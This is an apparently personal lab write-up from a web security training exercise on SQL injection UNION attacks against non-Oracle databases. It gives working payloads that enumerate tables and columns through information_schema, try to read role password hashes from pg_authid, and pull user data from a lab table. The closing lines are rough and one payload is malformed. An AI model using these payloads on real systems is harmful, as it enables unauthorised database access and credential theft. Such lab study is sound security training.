# Non-Oracle databases listing contents
#DATABASEENUM 
#UNION 
#WRITEUP 

Follow the [[Methodology UNION attacks]]

## 1. Number of columns of result set

![[Attacks/Enumerating the database/labs/SQL injection attack, listing the database contents on non-Oracle databases/images/columns.png]]
There are two columns on the result set.

## 2. Columns that can hold string data

Both columns can hold string data.

![[string.png]]

## 3. Exploitation

### List tables

Select the `TABLE_NAME` column from `information_schema.tables`

![[Pasted image 20220521222233.png]]

The payload

```SQL
' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
```

Then inspect the columns on the interesting tables.

### Listing columns of interesting tables

Inspect the tables for keywords like `password`

```SQL
SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = '$TABLE NAME$'
```
```SQL
' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = '$TABLE NAME$'--
```


' UNION SELECT 'rolname' 'rolpassword', NULL FROM pg_authid--

'+UNION+SELECT+username_dyquix,NULL+FROM+users_reacks--

the table users_reacks has the info